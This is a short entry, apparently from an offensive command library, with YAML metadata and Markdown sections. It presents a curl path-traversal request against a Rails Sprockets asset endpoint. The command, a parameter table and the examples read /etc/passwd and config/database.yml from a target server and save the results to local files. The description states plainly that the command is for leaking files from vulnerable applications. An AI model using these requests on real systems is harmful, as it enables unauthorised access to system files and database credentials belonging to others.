---
data: >-
  curl -v "http://target.com/assets/dummy.png?../../../etc/passwd" -H "Accept:
  text/plain" --output leaked_file.txt
tags:
  - web
  - exploitation
  - path-traversal
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 3d572c0f-0035-4c6e-a349-3cbb8e02c061
created_at: '2025-12-14T17:26:22.578Z'
updated_at: '2025-12-14T17:26:22.578Z'
verified: false
validated: true
submitted: true
---
# curl-path-traversal-request

## Command

```bash
curl -v "http://target.com/assets/dummy.png?../../../etc/passwd" -H "Accept: text/plain" --output leaked_file.txt
```

## Description

This curl command sends an HTTP GET request to exploit path traversal in a Rails Sprockets endpoint, attempting to read /etc/passwd by appending traversal sequences to the asset path. Use it to leak files in vulnerable applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output showing headers and response details | No |
| URL (e.g., "http://target.com/assets/dummy.png?../../../etc/passwd") | Target endpoint with traversal payload; replace target.com and file path | Yes |
| `-H "Accept: text/plain"` | Sets accept header to retrieve raw file content | No |
| `--output leaked_file.txt` | Saves response body to file | No |

## Examples

### Basic Usage

```bash
curl "http://target.com/assets/dummy.png?../../../etc/passwd"
```

### Advanced Usage

```bash
curl -v -H "Accept: text/plain" "https://target.com/assets/test.jpg?../../../../config/database.yml" --output db_config.yml --insecure
```

## Expected Output

Successful execution returns the contents of /etc/passwd (e.g., root:x:0:0:root:/root:/bin/bash) in the response body or saved file. Verbose mode shows HTTP 200 OK; failure may show 404 or asset error.

## Related

- [[Related Procedure]]
